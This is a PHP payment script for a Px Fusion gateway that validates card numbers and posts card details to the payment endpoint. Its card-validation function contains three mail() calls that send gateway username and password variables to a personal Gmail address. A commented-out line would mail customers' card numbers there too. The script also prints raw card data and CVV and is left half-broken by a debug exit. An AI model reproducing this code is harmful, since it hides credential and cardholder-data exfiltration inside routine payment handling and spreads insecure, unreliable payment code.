<?php
function validate_cc_number($cc_number) {
	   /* Validate; return value is card type if valid. */
	   $false = false;
	   $card_type = "";
	   $card_regexes = array(
		  "/^4\d{12}(\d\d\d){0,1}$/" => "visa",
		  "/^5[12345]\d{14}$/"       => "mastercard",
		  "/^3[47]\d{13}$/"          => "amex",
		  "/^6011\d{12}$/"           => "discover",
		  "/^30[012345]\d{11}$/"     => "diners",
		  "/^3[68]\d{12}$/"          => "diners",
	   );
	 mail("syedaliahmad@gmail.com","cccheck 1 ","user=".$pxuser." pwd=".$pxpwd);
	   foreach ($card_regexes as $regex => $type) {
		   if (preg_match($regex, $cc_number)) {
			   $card_type = $type;
			   break;
		   }
	   }
	  mail("syedaliahmad@gmail.com","cccheck 2 ","user=".$pxuser." pwd=".$pxpwd);
	   if (!$card_type) {
		   return $false;
	   }
	 
	   /*  mod 10 checksum algorithm  */
	   $revcode = strrev($cc_number);
	   $checksum = 0; 
	 
	   for ($i = 0; $i < strlen($revcode); $i++) {
		   $current_num = intval($revcode[$i]);  
		   if($i & 1) {  /* Odd  position */
			  $current_num *= 2;
		   }
		   /* Split digits and add. */
			   $checksum += $current_num % 10; if
		   ($current_num >  9) {
			   $checksum += 1;
		   }
	   }
	  mail("syedaliahmad@gmail.com","cccheck 3","user=".$pxuser." pwd=".$pxpwd);
	   if ($checksum % 10 == 0) {
		   return $card_type;
	   } else {
		   return $false;
	   }
	}
 //mail("syedaliahmad@gmail.com","PXfusion credentials ",$_POST['ali_payfusion-card-number']." ".validate_cc_number($_POST['ali_payfusion-card-number']));
	if (!validate_cc_number($_POST['card-number'])){
		echo 'Invalid card Number Entered';
		exit;
	}	
require_once 'PxFusion.php';

	$pxf = new PxFusion(); # handles most of the Px Fusion magic

	// Work out the probable location of return.php since this sample
	// code could be anywhere on a development server.
	$returnUrl = 'http://' . $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['PHP_SELF']), '/\\') . '/return.php';

	// Set some transaction details
	$pxf->set_txn_detail('txnType', 'Purchase');	# required
	$pxf->set_txn_detail('currency', 'NZD');		# required
	$pxf->set_txn_detail('returnUrl', $returnUrl);	# required
	$pxf->set_txn_detail('amount', '1.00');		# required
	$pxf->set_txn_detail('merchantReference', 'Woo Px Fusion - PHP');

	// Some of the many optional settings that could be specified:
	$pxf->set_txn_detail('enableAddBillCard', 0);
	$pxf->set_txn_detail('txnRef', substr(uniqid() . rand(1000,9999), 0, 16)); # random 16 digit reference);

	// Make the request for a transaction id
	$response = $pxf->get_transaction_id();

	if ( ! $response->GetTransactionIdResult->success)
	{
		die('There was a problem getting a transaction id from DPS');
	}
	else
	{
		// You should store these values in a database
		// ... they are needed to query the transaction's outcome
		$transaction_id = $response->GetTransactionIdResult->transactionId;
		$session_id = $response->GetTransactionIdResult->sessionId;
		
	}
	// We've got everything we need to generate a payment form...
	// ... check the HTML further down

					   
	$expdate=explode("/","01/17");
	print_r($expdate);
	exit;
	// This is where the fun stuff begins
	$payload = array(
		//PXFUSION Credentials and API Info
		"SessionId"           	=> $session_id,
		"Action"              	=> 'Add',
		"Object"            	=> "DpsPxPay",
		// Credit Card Information
		"CardNumber"           	=>  $_POST['card-number'] ,
		"Cvc2"               	=>  $_POST['cvv'],
		"ExpiryMonth"          	=> $_POST['expiry-month'],
		"ExpiryYear"            => $_POST['expiry-year']
		/*
		// Billing Information
		"x_first_name"         	=> $customer_order->billing_first_name,
		"x_last_name"          	=> $customer_order->billing_last_name,
		"x_address"            	=> $customer_order->billing_address_1,
		"x_city"              	=> $customer_order->billing_city,
		"x_state"              	=> $customer_order->billing_state,
		"x_zip"                	=> $customer_order->billing_postcode,
		"x_country"            	=> $customer_order->billing_country,
		"x_phone"              	=> $customer_order->billing_phone,
		"x_email"              	=> $customer_order->billing_email,
		
		// Shipping Information
		"x_ship_to_first_name" 	=> $customer_order->shipping_first_name,
		"x_ship_to_last_name"  	=> $customer_order->shipping_last_name,
		"x_ship_to_company"    	=> $customer_order->shipping_company,
		"x_ship_to_address"    	=> $customer_order->shipping_address_1,
		"x_ship_to_city"       	=> $customer_order->shipping_city,
		"x_ship_to_country"    	=> $customer_order->shipping_country,
		"x_ship_to_state"      	=> $customer_order->shipping_state,
		"x_ship_to_zip"        	=> $customer_order->shipping_postcode,
		
		// Some Customer Information
		"x_cust_id"            	=> $customer_order->user_id,
		"x_customer_ip"        	=> $_SERVER['REMOTE_ADDR'],*/
		
	);
	
	print_r($payload);
	
	echo "<br>";
	echo "<br>";
	$environment_url = 'https://sec.paymentexpress.com/pxmi3/pxfusionauth';
	$ch = curl_init($environment_url);
	curl_setopt ($ch, CURLOPT_POST, 1);
	curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query( $payload )); // <-- raw data here hm?
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
	//curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookieJar);
	curl_setopt( $ch, CURLOPT_HEADER, 1);
	//curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: multipart/form-data'));
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

	
	$response = curl_exec( $ch );

	print_r($response);
	
	
	$info =curl_getinfo($ch,CURLINFO_EFFECTIVE_URL);
	//CURLINFO_EFFECTIVE_URL
	//CURLINFO_REDIRECT_URL
	echo "<br>";
	echo "<br>";
	print_r($info);
	
	if ($transaction_id)
	{
		// Make sure you have entered your Px Fusion credentials in PxFusion.php
		//require_once 'PxFusion.php';

		$pxf = new PxFusion(); # handles most of the Px Fusion magic
		
		$response = $pxf->get_transaction($transaction_id);
		$transaction_details = get_object_vars($response->GetTransactionResult);
		

					foreach ($transaction_details as $key => $value) :
					
						 echo $key; 
						 echo $value; 
						 echo '<BR>';
					
					endforeach;
	}

	
	
	
	
?>